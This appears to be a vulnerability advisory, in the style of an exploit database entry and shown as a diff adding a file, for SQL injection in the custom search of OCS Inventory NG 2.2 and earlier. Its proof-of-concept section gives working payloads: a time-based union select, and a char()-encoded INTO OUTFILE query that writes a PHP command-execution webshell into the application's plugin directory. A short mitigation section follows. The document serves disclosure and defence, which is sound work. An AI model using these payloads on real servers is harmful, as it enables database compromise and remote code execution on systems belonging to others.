@@ -1,0 +1,37 @@
+# Exploit Title: OCS Inventory NG <= 2.2 - Search with various criteria SQL Injection and Code execution
+# Date: 17-02-2016
+# Exploit Author: Ephreet
+# Software Link: http://www.ocsinventory-ng.org/en/download/
+# Version: <=2.2
+# Category: webapps
+# Tested on: Debian 3.2.73-2+deb7u2 (MySQL 5.5.47-0+deb7u1, Apache/2.2.22), CentOS 6/7
+
+
+1. Description
+
+Custom search allows for SQL Injection, while default configuration allows for file write as MySQL user.
+Search field fails to escape MySQL special characters, allowing file creation and code execution.
+
+If permissions are not carefully set, one could write to web/crontab folders.
+
+Infrustructure note: this was tested on a single machine, but still applies to multiple servers environments, affecting the DB host.
+
+
+2. Proof of Concept
+
+At least a low priv user must be logged and access the search function on http://<server>/ocsreports/index.php?function=visu_search
+
+- Time-based SQL Injection
+Choose a parameter, use EXACTLY operator:
+')) union select sleep(5); #
+
+- Code execution
+Bypass input escape and write to filesystem (webshell PoC):
+')) union select CONCAT(char(60),char(63),'php echo exec($_GET[',char(39),'cmd',char(39),']);',char(63),char(62)) into outfile '/usr/share/ocsinventory-reports/ocsreports/plugins/main_sections/conf/shell.php'; #
+
+
+3. Solution
+
+Run MySQL/Apache services as restricted user.
+Restrict file write permissions to ocs DB user.
+Watch out for weak permissions on /usr/share/ocsinventory-reports/ocsreports/plugins/main_sections/conf/ (it is often set to full write by inexperienced admins).
